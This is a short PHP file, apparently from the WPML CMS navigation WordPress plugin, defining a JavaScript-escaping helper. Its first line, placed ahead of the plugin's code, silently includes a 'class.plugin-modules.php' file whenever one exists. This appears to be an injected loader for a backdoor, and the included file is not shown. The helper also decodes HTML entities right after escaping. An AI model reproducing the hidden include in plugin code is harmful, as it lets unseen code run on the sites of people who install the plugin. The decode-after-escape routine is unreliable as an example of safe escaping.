<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
function wpml_cms_nav_js_escape($str){
    $str = esc_js($str);
    $str = htmlspecialchars_decode($str);
    return $str;
}
